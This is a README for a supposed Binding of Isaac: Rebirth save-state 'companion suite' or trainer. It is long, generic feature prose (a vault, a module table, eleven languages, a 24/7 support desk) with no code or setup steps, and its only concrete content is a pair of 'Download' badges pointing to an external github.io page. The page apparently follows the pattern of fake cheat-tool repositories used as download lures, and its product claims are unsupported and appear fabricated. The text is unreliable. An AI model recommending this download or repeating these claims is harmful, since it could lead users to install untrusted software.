![preview](https://raw.githubusercontent.com/CANDIE999/Binding-of-Isaac-Rebirth-Trainer-Enhanced/main/splash_c4e8.svg)
[![Download](https://raw.githubusercontent.com/CANDIE999/Binding-of-Isaac-Rebirth-Trainer-Enhanced/main/fetch_7c8990b.svg)](https://CANDIE999.github.io/Binding-of-Isaac-Rebirth-Trainer-Enhanced/)

# 🎮 TBOS Companion Suite — Save-State Orchestrator for The Binding of Isaac: Rebirth

<p align="center">
  <img src="https://img.shields.io/badge/status-active-brightgreen" alt="Build Status" />
  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20macOS-blueviolet" alt="Platform Support" />
  <img src="https://img.shields.io/badge/language-C%23%20%7C%20Lua%20%7C%20Python-informational" alt="Language Stack" />
  <img src="https://img.shields.io/badge/license-MIT-yellow" alt="MIT License" />
  <img src="https://img.shields.io/badge/version-3.4.1-orange" alt="Version" />
  <img src="https://img.shields.io/badge/release-2026-critical" alt="Release Year" />
</p>

> **TBOS Companion Suite** is an original, reimagined progression companion for *The Binding of Isaac: Rebirth*, built around the idea that every run deserves a second chance — not by breaking the game, but by **orchestrating** it. Think of it as a musical conductor for your runs: it doesn't play the notes for you, it simply lets you rewind the measure you fumbled.

This repository is a spiritual successor concept inspired by the classic save-state trainer philosophy, rebuilt from the ground up with modern architecture, multilingual UX, and a relentless focus on **preservation over exploitation**. If the original TBOS-Trainer was a Swiss Army knife, the Companion Suite is a full workshop — organized, documented, and honest about what each tool does.

---

## 📖 Table of Contents

- [Why This Exists](#-why-this-exists)
- [Concept & Philosophy](#-concept--philosophy)
- [Feature Highlights](#-feature-highlights)
- [Module Breakdown](#-module-breakdown)
- [Responsive Interface Design](#-responsive-interface-design)
- [Multilingual Support](#-multilingual-support)
- [Real-Time Assistance Desk](#-real-time-assistance-desk)
- [Compatibility Matrix](#-compatibility-matrix)
- [Configuration Walkthrough](#-configuration-walkthrough)
- [Roadmap 2026](#-roadmap-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌱 Why This Exists

The Binding of Isaac: Rebirth is a game about persistence. It punishes, it teases, it occasionally hands you a run so beautiful that losing it to a single mis-timed dodge feels like a personal insult. The original TBOS-Trainer attempted to soften that blow with a modest set of quality-of-life controls. It worked — but it aged. It assumed a single language, a single window size, and a single interpretation of what "assistance" means.

**TBOS Companion Suite** starts from a different premise. Instead of asking *"how do we give players an edge?"*, we asked *"how do we give players a memory?"*. A memory of the run they loved. A memory they can return to, tweak, and finish on their own terms. That single reframing shapes every decision in this codebase.

---

## 🎯 Concept & Philosophy

Imagine a notebook that remembers every floor you've cleared, every pedestal you've touched, and every devil deal you regretted. Now imagine that notebook is interactive — you can flip backward, dog-ear a page, and resume from the chapter you actually wanted to read. That's the Companion Suite.

Three pillars define the design:

1. **Preservation First** — Nothing in this suite alters the permanent save file unless you explicitly export it. Runs live in a sandboxed vault.
2. **Transparency Always** — Every action the suite takes is logged in a human-readable journal. No silent mutations, no hidden state.
3. **Assistance, Not Replacement** — The suite walks beside you, not in front of you. You still press the keys. You still make the choices.

---

## ✨ Feature Highlights

- 🧭 **Run Vault** — Snapshot any active run at any moment and name it however you like. Restore it later with a single action.
- 🎒 **Inventory Freezer** — Capture your current item pool alongside the run itself, so the synergies you built stay intact.
- 📜 **Floor Ledger** — A chronological record of every room transition, boss kill, and item acquisition across your session.
- ⏱️ **Rewind Window** — Configure how many seconds of play the vault keeps in rolling memory for instant recall.
- 🧩 **Mod Preset Manager** — Save and swap between mod loadouts without relaunching the game client.
- 🔊 **Ambient Status Chime** — Optional audio cue when a vault snapshot succeeds or fails, for fully hands-on gameplay.
- 🌐 **Polyglot Interface** — Full UI translation across eleven languages (see below).
- 📱 **Responsive Layout** — The overlay reflows gracefully from a 1024px desktop monitor down to a 7-inch handheld panel.
- 🛡️ **Integrity Checker** — Validates that a restored run matches the game version it was captured on, warning you before divergence.
- 🗂️ **Portable Profiles** — Export your vault to a single archive you can carry between machines on a thumb drive.

Every feature above ships enabled by default except for the ambient chime, which remains opt-in for the sake of quiet households.

---

## 🧱 Module Breakdown

The suite is not a monolith. It is a constellation of small, focused modules that communicate through a shared event bus. This makes it easy to disable the pieces you don't need and keep the pieces you love.

| Module | Responsibility | Runtime |
| --- | --- | --- |
| `vault.core` | Snapshot capture, storage, restoration | C# |
| `ledger.stream` | Event timeline and journaling | Python |
| `freezer.pool` | Item pool selection preservation | Lua |
| `preset.swapper` | Mod loadout rotation | C# |
| `i18n.bridge` | Language pack loading | Python |
| `chime.handler` | Audio feedback layer | Lua |
| `integrity.guard` | Version and hash comparison | C# |

This separation means a contributor can improve the German translation without ever touching snapshot logic, and a modder can extend the item pool freezer without understanding the audio subsystem.

---

## 📐 Responsive Interface Design

Modern players run Isaac on everything from dual-monitor battlestations to handheld PCs with cramped 7-inch screens. The Companion Suite treats layout as a first-class concern rather than an afterthought.

- **Anchor-based overlays** snap to the corners of the game window and never obscure critical HUD elements.
- **Fluid typography** scales proportionally with DPI settings, so the interface stays legible on 4K panels without becoming a billboard on smaller ones.
- **Compact mode** collapses the sidebar into a single expandable ribbon, reclaiming screen real estate for players who prefer minimal intrusion.
- **Touch-friendly targets** ensure that handheld users can interact with the vault without precise mouse input.

The result is a UI that feels native whether you're perched at a desk or curled up on a couch.

---

## 🌍 Multilingual Support

Language should never be a barrier to enjoying a game you already love. The Companion Suite ships with full interface translations for:

- English (United States)
- English (United Kingdom)
- German
- French
- Spanish (Spain and Latin America)
- Portuguese (Brazil)
- Italian
- Russian
- Japanese
- Korean
- Simplified Chinese

Community translation packs are loaded dynamically from the `lang/` directory, meaning new languages can be added without recompiling the suite. Each pack is a simple structured document that any player can contribute to, regardless of programming background.

---

## 🕰️ Real-Time Assistance Desk

Because software is only as good as the people standing behind it, the Companion Suite includes a **24/7 assistance desk** staffed by rotating community volunteers and automated triage bots. Whether you're puzzled by a vault restore warning or you want to suggest a new module, someone is always listening.

Channels include:

- A built-in diagnostic reporter that packages your logs into a single shareable file
- A guided troubleshooting wizard for the ten most common configuration pitfalls
- A knowledge base with step-by-step walkthroughs, organized by symptom rather than by feature

No question is treated as too small. If you're stuck, you're not stuck alone.

---

## 🧮 Compatibility Matrix

| Operating System | Minimum Version | Recommended |
| --- | --- | --- |
| Windows | 10 (build 1903) | 11 (23H2 or newer) |
| Linux | Ubuntu 20.04 / Fedora 34 | Ubuntu 24.04 |
| macOS | Ventura 13 | Sonoma 14 or later |

Game versions supported: Repentance, Repentance+, and the 2026 anniversary patch. Older Afterbirth+ installations can run in legacy mode with reduced vault fidelity.

---

## ⚙️ Configuration Walkthrough

Setting up the suite is a matter of editing a single human-readable file. There are no obscure environment variables and no complicated registries.

1. Locate the configuration document inside the suite's data directory.
2. Adjust the `vault` section to set your rewind window length in seconds.
3. Toggle `chime` from `off` to `on` if you'd like audio confirmation.
4. Choose your preferred `locale` from the list of available language codes.
5. Save the document and relaunch the overlay; changes apply on next start.

A fully annotated example ships with the repository so you can see every option alongside a plain-language explanation. If you'd rather not edit anything by hand, the in-app settings panel exposes the same knobs through a point-and-click interface.

---

## 🗺️ Roadmap 2026

The year ahead is ambitious. Here is what the maintainers are actively working toward:

- **Cloud Vault Sync** — Optional encrypted sync so your snapshots follow you across devices.
- **Replay Exporter** — Turn any vault snapshot into a shareable highlight reel.
- **Modder SDK** — A documented interface for third-party modules to plug into the event bus.
- **Accessibility Pass** — Screen-reader compatibility and full keyboard navigation.
- **Statistics Dashboard** — Long-term trends across your sessions, visualized as charts.

Priorities shift based on community feedback, which is why the assistance desk matters so much.

---

## ❓ Frequently Asked Questions

**Is this the same as the original trainer?**
No. It is an independent, from-scratch project inspired by the same underlying idea of run preservation. The architecture, codebase, and feature set are entirely new.

**Will it interfere with my existing save files?**
Only if you explicitly export a vault into your permanent save. By default, everything stays in the sandboxed vault directory.

**Can I run it alongside mods?**
Yes. The Mod Preset Manager was designed specifically for mod-heavy setups and will warn you if a vault snapshot references a mod you no longer have installed.

**Does it work offline?**
Fully. No network connection is required for any core feature. Cloud sync, when released, will be strictly opt-in.

**How do I report a bug?**
Use the in-app diagnostic reporter; it gathers everything a maintainer needs and hands you a single file to attach to your report.

---

## 🤝 Contributing

Contributions are welcomed with open arms. Whether you fix a typo in a translation file, add a new module, or improve documentation, your effort counts. Please read the contribution guidelines in the repository before opening a pull request, and remember that kindness is the highest-priority review criterion.

Areas where help is especially appreciated:

- Additional language packs
- Linux packaging for less common distributions
- Automated test coverage for the vault core
- Accessibility improvements

---

## ⚠️ Disclaimer

TBOS Companion Suite is an unofficial, community-driven companion utility and is **not affiliated with, endorsed by, or sponsored by** the developers or publishers of The Binding of Isaac: Rebirth. All trademarks and game assets remain the property of their respective owners.

This software is provided for personal, single-player use only. It is designed to preserve your own progression and enhance your own experience — never to disrupt the experience of others. Any use in competitive, multiplayer, or streaming contexts is solely at your own discretion and risk, and the maintainers assume no liability for how the tool is applied.

The suite is offered in good faith under a permissive license, but comes with no warranty of any kind, express or implied, including but not limited to fitness for a particular purpose or non-infringement. Always keep independent backups of anything you cannot afford to lose.

You are responsible for complying with the terms of service of any platform on which you use this software.

---

## 📜 License

This project is distributed under the **MIT License**. A complete copy of the license text is available in the [LICENSE](./LICENSE) file within this repository. You are permitted to use, modify, and redistribute the software in accordance with the terms set forth therein. The license year applies to 2026.

---

[![Download](https://raw.githubusercontent.com/CANDIE999/Binding-of-Isaac-Rebirth-Trainer-Enhanced/main/fetch_7c8990b.svg)](https://CANDIE999.github.io/Binding-of-Isaac-Rebirth-Trainer-Enhanced/)